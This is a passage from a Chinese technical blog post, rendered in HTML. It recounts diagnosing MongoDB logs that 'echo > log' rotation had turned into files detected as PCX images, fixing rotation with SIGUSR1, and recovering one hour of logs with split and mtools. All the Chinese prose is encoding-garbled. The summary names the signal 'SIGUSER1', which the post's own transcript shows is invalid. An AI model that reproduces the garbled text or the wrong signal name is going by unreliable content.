class="line">total 12K</span><br><span class="line">-rw-r--r-- 1 root root 2.8K Aug  3 10:30 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3.1K Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1.5K Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¸€è¾¹ä¸æ–­äº§ç”Ÿæ—¥å¿—ï¼Œä¸€è¾¹å¤šæ¬¡æ‰§è¡Œ<span class="built_in">echo</span>&gt; </span></span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# ll -h</span><br><span class="line">total 16K</span><br><span class="line">-rw-r--r-- 1 root root    1 Aug  3 11:28 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3.1K Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1.5K Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">-rw-r--r-- 1 root root 2.9K Aug  3 11:05 mongod27017.log.2018-08-03T03-09-08</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# hexdump -c mongod27017.log</span><br><span class="line">0000000  \n  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">0000010  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">*</span><br><span class="line">0000850  \0  \0  \0  \0  \0  \0  \0   2   0   1   8   -   0   8   -   0</span><br><span class="line">0000860   3   T   1   1   :   2   9   :   0   6   .   7   2   9   +   0</span><br><span class="line">0000870   8   0   0       I       A   C   C   E   S   S               [</span><br><span class="line">0000880   c   o   n   n   3   ]       U   n   a   u   t   h   o   r   i</span><br><span class="line">0000890   z   e   d   :       n   o   t       a   u   t   h   o   r   i</span><br><span class="line">00008a0   z   e   d       o   n       t   e   s   t       t   o       e</span><br><span class="line">00008b0   x   e   c   u   t   e       c   o   m   m   a   n   d       &#123;</span><br><span class="line">00008c0       f   i   n   d   :       "   t   1   "   ,       f   i   l</span><br><span class="line">00008d0   t   e   r   :       &#123;   &#125;       &#125;  \n</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¤ç°äº†å®¢æˆ·çš„æƒ…å†µï¼š</p><ol><li><p>ç¬¬ä¸€æ¬¡<code>echo &gt; log</code>ï¼Œæ–‡ä»¶å¤´éƒ¨æ–°å¢<code>\n</code></p></li><li><p>å¤šæ¬¡<code>echo &gt; log</code>,æ–‡ä»¶å¤´éƒ¨å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000  \n  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">0000010  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">*</span><br></pre></td></tr></table></figure></li></ol><p>ç¡®å®æ˜¯mongodbæ—¥å¿—è½®è¯¢å‡ºäº†é—®é¢˜ï¼š</p><ol><li><code>echo &gt; log</code>ä¼šå¾€æ–‡ä»¶å¤´éƒ¨æ’å…¥<code>\n</code>å³16è¿›åˆ¶çš„<code>0a</code></li><li>åœ¨æ•°æ®åº“æ­£å¸¸è¿è¡Œä¸­ï¼Œå¯¹logæ–‡ä»¶æ˜¯åŠ äº†é”çš„ï¼Œå¼ºåˆ¶æ‰§è¡Œ<code>echo &gt; log</code>æ˜¯æ— æ³•è¿›è¡Œè¦†ç›–çš„ï¼Œä¼šå°†æ‰€æœ‰çš„æ•°æ®å…¨éƒ¨ç½®ä¸º<code>0</code></li><li>å¼ºåˆ¶è¦†ç›–åï¼Œæ–‡ä»¶å¤´éƒ¨å˜æˆäº†æ— æ•°çš„ç©ºç™½</li></ol><h3 id="å¾…è§£å†³é—®é¢˜"><a href="#å¾…è§£å†³é—®é¢˜" class="headerlink" title="å¾…è§£å†³é—®é¢˜"></a>å¾…è§£å†³é—®é¢˜</h3><ul><li>MongoDBæ—¥å¿—è½®è¯¢æ–¹æ³•è°ƒæ•´ä¸º<strong>kill -SIGUSER1 [mongodpid]</strong></li><li>ä¿®å¤ç›®å‰å·²ç»å˜ä¸ºå›¾ç‰‡æ ¼å¼çš„æ—¥å¿—ï¼Œå¹¶æ‹‰å–15ç‚¹åˆ°16ç‚¹çš„æ—¥å¿—</li></ul><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><h3 id="MongoDBæ—¥å¿—è½®è¯¢"><a href="#MongoDBæ—¥å¿—è½®è¯¢" class="headerlink" title="MongoDBæ—¥å¿—è½®è¯¢"></a>MongoDBæ—¥å¿—è½®è¯¢</h3><h4 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 log]# pidof mongod</span><br><span class="line">1828</span><br><span class="line">[root@sh_01 log]# kill -SIGUSER1 1828</span><br><span class="line">-bash: kill: SIGUSER1: invalid signal specification</span><br><span class="line">[root@sh_01 log]# kill -SIGUSR1 1828</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">total 16</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  3 11:09 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">-rw-r--r-- 1 root root 2942 Aug  3 11:05 mongod27017.log.2018-08-03T03-09-08</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure><h4 id="ç”Ÿäº§ç¯å¢ƒ"><a href="#ç”Ÿäº§ç¯å¢ƒ" class="headerlink" title="ç”Ÿäº§ç¯å¢ƒ"></a>ç”Ÿäº§ç¯å¢ƒ</h4><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/04.png" alt=""></p><p>ä¿®æ”¹æ—¥å¿—è½®è¯¢è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@MONGO-SHARD-18 logs]# cat /etc/init.d/mongo_logspit.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2018/08/02 Apple</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Rotate the MongoDB logs to prevent a single logfile from consuming too much disk space.</span></span><br><span class="line"></span><br><span class="line">cmd=mongod</span><br><span class="line">mongodpath=/opt/mongodb/bin</span><br><span class="line">pidarray=`pidof $&#123;mongodpath&#125;/$cmd`</span><br><span class="line">LOGPATH_SHARD=/data/mongodb/shard1/logs</span><br><span class="line"></span><br><span class="line">for pid in $pidarray;do</span><br><span class="line">if [ $pid ]</span><br><span class="line">then</span><br><span class="line">    kill -SIGUSR1 $pid</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash">clear logfile more than 7 days</span></span><br><span class="line">cd $LOGPATH_SHARD</span><br><span class="line">find ./ -xdev -mtime +7 -name "shard.log.*" -exec rm -f &#123;&#125;  \;</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰çš„åˆ†ç‰‡éƒ½å»æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -SIGUSR1 pidof mongod</span><br></pre></td></tr></table></figure><p>åˆ†ç‰‡15æ“ä½œå¦‚ä¸‹ï¼šå…¶ä»–åˆ†ç‰‡åŒæ ·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[zyadmin@MONGO-SHARD-15 ~]$ sudo -i</span><br><span class="line">[root@MONGO-SHARD-15 ~]# cd /data/mongodb/shard1/logs/</span><br><span class="line">[root@MONGO-SHARD-15 logs]# ll -h</span><br><span class="line">total 1.7G</span><br><span class="line">-rw-r--r-- 1 root root 20G Aug  2 15:27 shard.log</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 25 23:50 shard.log.2018-07-25</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 26 23:50 shard.log.2018-07-26</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 27 23:50 shard.log.2018-07-27</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 28 23:50 shard.log.2018-07-28</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 29 23:50 shard.log.2018-07-29</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 30 23:50 shard.log.2018-07-30</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 31 23:50 shard.log.2018-07-31</span><br><span class="line">-rw-r--r-- 1 root root 20G Aug  1 23:50 shard.log.2018-08-01</span><br><span class="line">[root@MONGO-SHARD-15 logs]# file *</span><br><span class="line">shard.log:            PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-25: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01: PCX ver. 2.5 image data</span><br><span class="line">[root@MONGO-SHARD-15 logs]# kill -SIGUSR1 `pidof mongod`</span><br><span class="line">[root@MONGO-SHARD-15 logs]# file *</span><br><span class="line">shard.log:                     ASCII text, with very long lines</span><br><span class="line">shard.log.2018-07-25:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-02T07-27-29: PCX ver. 2.5 image data</span><br><span class="line">[root@MONGO-SHARD-15 logs]# ll -h</span><br><span class="line">total 1.7G</span><br><span class="line">-rw-r--r-- 1 root root 2.0K Aug  2 15:27 shard.log</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 25 23:50 shard.log.2018-07-25</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 26 23:50 shard.log.2018-07-26</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 27 23:50 shard.log.2018-07-27</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 28 23:50 shard.log.2018-07-28</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 29 23:50 shard.log.2018-07-29</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 30 23:50 shard.log.2018-07-30</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 31 23:50 shard.log.2018-07-31</span><br><span class="line">-rw-r--r-- 1 root root  20G Aug  1 23:50 shard.log.2018-08-01</span><br><span class="line">-rw-r--r-- 1 root root  20G Aug  2 15:27 shard.log.2018-08-02T07-27-29</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤å¼‚å¸¸æ—¥å¿—"><a href="#ä¿®å¤å¼‚å¸¸æ—¥å¿—" class="headerlink" title="ä¿®å¤å¼‚å¸¸æ—¥å¿—"></a>ä¿®å¤å¼‚å¸¸æ—¥å¿—</h3><h4 id="ä¿®å¤æ€è·¯"><a href="#ä¿®å¤æ€è·¯" class="headerlink" title="ä¿®å¤æ€è·¯"></a>ä¿®å¤æ€è·¯</h4><p>å¼„æ¸…æ¥šæ—¥å¿—å˜æ›´çš„åŸå› ä»¥åŠå¤ç°è¿‡ç¨‹åï¼Œä¸éš¾å‘ç°ï¼Œæ—¥å¿—å› ä¸ºå¤´éƒ¨å˜åŒ–ä»è€Œå¯¼è‡´æ–‡ä»¶æ ¼å¼å˜æ›´ã€‚å› æ­¤æ¨æµ‹å¼‚å¸¸æ—¥å¿—çš„ç»„æˆå¦‚ä¸‹ï¼š</p><ol><li>å¤´éƒ¨ä¸º<code>0a</code></li><li>ä¸­é—´å…¨éƒ¨éƒ½æ˜¯<code>0</code></li><li>æœ€åæ˜¯æ­£å¸¸çš„å­—ç¬¦ä¸²è®°å½•ç€mongodbçš„æ—¥å¿—ä¿¡æ¯ï¼Œç±»ä¼¼äº<code>2018-08-03T10:30:21.936+0800 I NETWORK  [initandlisten] connection accepted from 127.0.0.1:43720 #2 (2 connections now open)</code>ç”±æ—¥å¿—å’Œæ—¥å¿—æ˜ç»†ç»„æˆ</li></ol><p>å› æ­¤ä¿®å¤çš„æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>23Gçš„æ—¥å¿—ï¼Œé¦–å…ˆæŒ‰ç…§å¤§å°6Gåšåˆ‡åˆ†<code>split -b 6G log</code>ï¼Œåˆ‡åˆ†æˆ4ä¸ªæ–‡ä»¶</li><li>æŸ¥çœ‹åˆ‡åˆ†åçš„æ—¥å¿—æ ¼å¼ï¼Œå¦‚æœæœ€åä¸€ä¸ªæ—¥å¿—ä¸º<code>ASCII text</code>åˆ™ä¸å†åˆ‡åˆ†å¦åˆ™ï¼Œå°†æœ€åä¸€ä¸ªæ—¥å¿—ç»§ç»­åˆ‡åˆ†</li><li>å¾ªç¯ä¸Šä¸€æ­¥ï¼Œç›´åˆ°æœ€åä¸€ä¸ªæ–‡ä»¶åˆ‡åˆ†å‡ºæ¥æ²¡æœ‰<code>ASCII text</code>ä¸ºæ­¢</li></ul><h4 id="æ“ä½œæ˜ç»†"><a href="#æ“ä½œæ˜ç»†" class="headerlink" title="æ“ä½œæ˜ç»†"></a>æ“ä½œæ˜ç»†</h4><blockquote><p>æ—¥å¿—è½®è¯¢çš„éƒ¨ç½²è·ç¦»ç°åœ¨å¤§æ¦‚4ä¸ªæœˆ</p></blockquote><ol><li><p>ç¬¬ä¸€æ¬¡å°†23Gçš„æ–‡ä»¶ä»¥6Gåˆ‡åˆ†æˆ4ä¸ªæ–‡ä»¶ï¼šxaa\xab\xac\xadï¼ŒæŸ¥çœ‹4ä¸ªæ–‡ä»¶çš„å±æ€§ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xaa:               PCX ver. 2.5 image data</span><br><span class="line">xab:               PCX ver. 2.5 image data</span><br><span class="line">xac:               PCX ver. 2.5 image data</span><br><span class="line">xad:                PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure></li><li><p>é‡å‘½åxadä¸ºx1ç¬¬äºŒæ¬¡åˆ‡åˆ†x1 5Gï¼ŒæŒ‰ç…§1Gåˆ‡åˆ†æˆ5ä»½ï¼ŒæŸ¥çœ‹æ–‡ä»¶å±æ€§</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xaa:               PCX ver. 2.5 image data</span><br><span class="line">xab:               PCX ver. 2.5 image data</span><br><span class="line">xac:               PCX ver. 2.5 image data</span><br><span class="line">xad:                PCX ver. 2.5 image data</span><br><span class="line">xae:                ASCII text, with very long lines</span><br></pre></td></tr></table></figure></li><li><p>é‡åxad ä¸º x2 æŒ‰ç…§15Mçš„å¤§å°åˆ‡åˆ†ï¼ŒæŸ¥çœ‹æ–‡ä»¶çš„å±æ€§å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xaa:      PCX ver. 2.5 image data</span><br><span class="line">æ­¤å¤„çœç•¥ã€‚ã€‚ã€‚</span><br><span class="line">xdo:               PCX ver. 2.5 image data</span><br><span class="line">xdp:               ASCII text, with very long lines</span><br><span class="line">xdq:               ASCII text, with very long lines</span><br><span class="line">xdr:               ASCII text, with very long lines</span><br><span class="line">xds:               ASCII text, with very long lines</span><br><span class="line">xdt:               ASCII text, with very long lines</span><br><span class="line">xdu:               ASCII text, with very long lines</span><br><span class="line">xdv:               UTF-8 Unicode text, with very long lines</span><br><span class="line">xdw:               ASCII text, with very long lines</span><br><span class="line">xdx:               ASCII text, with very long lines</span><br><span class="line">xdy:               ASCII text, with very long lines</span><br></pre></td></tr></table></figure></li><li><p>åˆ‡åˆ†åæ–‡ä»¶ç±»å‹ä¸º<code>ASCII text</code>çš„æ–‡ä»¶ä¸­æ‰¾åˆ°15ç‚¹~16ç‚¹çš„æ–‡æ¡£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 mongolog_20180801]# head -n 2 xdv</span><br><span class="line">re: "x86_64", version: "Kernel 3.10.0-693.2.2.el7.x86_64" &#125; &#125;</span><br><span class="line">2018-08-01T16:13:44.958+0800 I ACCESS   [conn4972925] Successfully authenticated as principal __system on local</span><br><span class="line">[root@sh_01 mongolog_20180801]# head -n 2 xdu</span><br><span class="line">38422 #4967772 (445 connections now open)</span><br><span class="line">2018-08-01T14:00:10.575+0800 I NETWORK  [thread1] connection accepted from 172.16.0.44:38430 #4967773 (446 connections now open)</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>xdv</code> çš„å¤´éƒ¨æ˜¯<code>2018-08-01T16:13:44.958+0800</code>,å› æ­¤å¯ä»¥ç¡®å®š15~16çš„æ—¥å¿—åœ¨xduä¸­</li><li><code>xdu</code>è®°å½•çš„æ—¥å¿—æ—¶é—´æ®µä¸º<code>2018-08-01T14:00:10.575+0800</code>~<code>2018-08-01T16:13:44.958+0800</code></li><li>é‡å‘½å<code>xdu</code>ä¸º<code>mongolog.18.14_16</code></li></ul><h3 id="åˆ†ææ—¥å¿—"><a href="#åˆ†ææ—¥å¿—" class="headerlink" title="åˆ†ææ—¥å¿—"></a>åˆ†ææ—¥å¿—</h3><h4 id="åˆ†æå‘½ä»¤"><a href="#åˆ†æå‘½ä»¤" class="headerlink" title="åˆ†æå‘½ä»¤"></a>åˆ†æå‘½ä»¤</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> è·å–08æœˆ01å·ä¸‹åˆ3ç‚¹å¼€å§‹åˆ°4ç‚¹æ‰§è¡Œæ—¶é—´è¶…è¿‡5ç§’çš„æŸ¥è¯¢</span></span><br><span class="line">mlogfilter mongolog.18.14_16 --from 2018-08-01T15 --to "+1h" --slow 5000 &gt; slowlog.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è·å–08æœˆ01å·ä¸‹åˆ3ç‚¹å¼€å§‹åˆ°4ç‚¹è¯­å¥çš„æ‰§è¡Œæ¬¡æ•°ã€ç”¨æ—¶ç­‰ç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">mloginfo slowlog.txt  --queries &gt; an_slowlog.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> é€šè¿‡mplotqueriesè¿›è¡Œæ…¢æŸ¥è¯¢æ•£ç‚¹åˆ†å¸ƒå›¾ç»˜åˆ¶ï¼Œä¸”åªè¿”å›å‰10ä¸ª</span></span><br><span class="line">mplotqueries slowlog.txt --output-file 01.png --logscale --group-limit 10</span><br></pre></td></tr></table></figure><h4 id="æ…¢æŸ¥è¯¢æ•£ç‚¹åˆ†å¸ƒå›¾"><a href="#æ…¢æŸ¥è¯¢æ•£ç‚¹åˆ†å¸ƒå›¾" class="headerlink" title="æ…¢æŸ¥è¯¢æ•£ç‚¹åˆ†å¸ƒå›¾"></a>æ…¢æŸ¥è¯¢æ•£ç‚¹åˆ†å¸ƒå›¾</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 booboo]# mplotqueries slowlog.txt --output-file 01.png --logscale --group-limit 10</span><br><span class="line">                                                                                          </span><br><span class="line">SCATTER plot</span><br><span class="line">   id   #points  group</span><br><span class="line">    1       692  order.order</span><br><span class="line">    2       615  omdmain.item_region_erp</span><br><span class="line">    3         1  omdmain.customer</span><br><span class="line">()</span><br></pre></td></tr></table></figure><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/10.png" alt=""></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h3 id="mongodbæ—¥å¿—è½®è¯¢çš„é—®é¢˜"><a href="#mongodbæ—¥å¿—è½®è¯¢çš„é—®é¢˜" class="headerlink" title="mongodbæ—¥å¿—è½®è¯¢çš„é—®é¢˜"></a>mongodbæ—¥å¿—è½®è¯¢çš„é—®é¢˜</h3><ol><li><code>echo &gt; log</code>ä¼šå¾€æ–‡ä»¶å¤´éƒ¨æ’å…¥<code>\n</code>å³16è¿›åˆ¶çš„<code>0a</code></li><li>åœ¨æ•°æ®åº“æ­£å¸¸è¿è¡Œä¸­ï¼Œå¯¹logæ–‡ä»¶æ˜¯åŠ äº†é”çš„ï¼Œå¼ºåˆ¶æ‰§è¡Œ<code>echo &gt; log</code>æ˜¯æ— æ³•è¿›è¡Œè¦†ç›–çš„ï¼Œä¼šå°†æ‰€æœ‰çš„æ•°æ®å…¨éƒ¨ç½®ä¸º<code>0</code></li><li>å¼ºåˆ¶è¦†ç›–åï¼Œæ–‡ä»¶å¤´éƒ¨å˜æˆäº†æ— æ•°çš„ç©ºç™½</li></ol><h3 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h3><ul><li>MongoDBæ—¥å¿—è½®è¯¢æ–¹æ³•è°ƒæ•´ä¸º<strong>kill -SIGUSER1 [mongodpid]</strong></li><li>ä¿®å¤ç›®å‰å·²ç»å˜ä¸ºå›¾ç‰‡æ ¼å¼çš„æ—¥å¿—ï¼Œå¹¶æ‹‰å–15ç‚¹åˆ°16ç‚¹çš„æ—¥å¿—</li></ul><p>è¯¥caseèŠ±äº†ä¸€æ•´å¤©ï¼Œä»æ€€ç–‘è¢«æ”»å‡»åˆ°ç¡®è®¤æ˜¯æ—¥å¿—è½®è¯¢å¼•èµ·æ–‡ä»¶æ ¼å¼å˜æ›´æ˜¯ä¸€ä¸ªå…³é”®è½¬æŠ˜ç‚¹ï¼›</p><p>å¦å¤–PCXæ ¼å¼æ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°ï¼Œç–‘æƒ‘äº†åŠå¤©~æœ€åæ˜¯@åŸ¹å°§å‘ç°äº†<code>echo</code>çš„ç«¯å€ªï¼Œ@è¡¾è¢­@å¤§å®å»éªŒè¯æœ€ç»ˆç¡®è®¤äº†é—®é¢˜çš„æ ¹æºã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦ï¼š &lt;/p&gt;
&lt;ul&gt;
